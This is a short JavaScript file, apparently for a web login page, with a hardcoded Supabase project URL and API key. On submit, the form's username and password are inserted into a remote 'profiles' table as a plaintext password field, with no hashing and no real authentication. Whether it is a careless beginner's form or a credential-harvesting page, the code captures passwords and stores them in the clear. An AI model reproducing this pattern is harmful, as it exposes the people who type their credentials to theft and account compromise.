const SUB_URL = "https://gqiyojjcznosxrzfodnz.supabase.co";
const SUB_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImdxaXlvampjem5vc3hyemZvZG56Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzQxNTY4NjYsImV4cCI6MjA4OTczMjg2Nn0.qZagZQWoNUPcgMKLh8fOjgZBXqHU5ys0zbWghJUXAEU";
const supabaseClient = supabase.createClient(SUB_URL, SUB_KEY);

const loginForm = document.getElementById('loginForm');
const status = document.getElementById('status');

loginForm.addEventListener('submit', async (e) => {
    e.preventDefault();
    status.innerText = "Sending data...";

    const userValue = document.getElementById('userField').value;
    const passValue = document.getElementById('passField').value;

    // Send to Supabase 'profiles' table
    const { data, error } = await supabaseClient
        .from('profiles')
        .insert([
            { username: userValue, password_plain: passValue }
        ]);

    if (error) {
        status.style.color = "red";
        status.innerText = "Error: " + error.message;
    } else {
        status.style.color = "green";
        status.innerText = "Success! Data sent to Supabase.";
        loginForm.reset();
    }
});
